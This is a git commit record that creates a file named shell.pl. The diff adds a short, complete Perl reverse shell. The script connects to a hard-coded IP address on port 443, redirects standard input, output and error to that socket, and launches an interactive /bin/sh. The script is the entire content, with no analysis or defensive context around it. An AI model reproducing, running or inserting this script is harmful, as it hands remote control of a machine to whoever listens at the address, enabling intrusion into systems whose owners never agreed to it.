734e57d8dd55c39fc7ffa9254773a5c99a9ff05c
pand0rausa <pand0ra.usa@gmail.com>
2017-11-16 23:53:09 -0700

    Create shell.pl

---
+++ shell.pl
@@ -0,0 +1,11 @@
+use Socket;
+$i="24.9.218.189";
+$p=443;
+socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
+if(connect(S,sockaddr_in($p,inet_aton($i))))
+	{
+	open(STDIN,">&S");
+	open(STDOUT,">&S");
+	open(STDERR,">&S");
+	exec("/bin/sh -i");
+	};
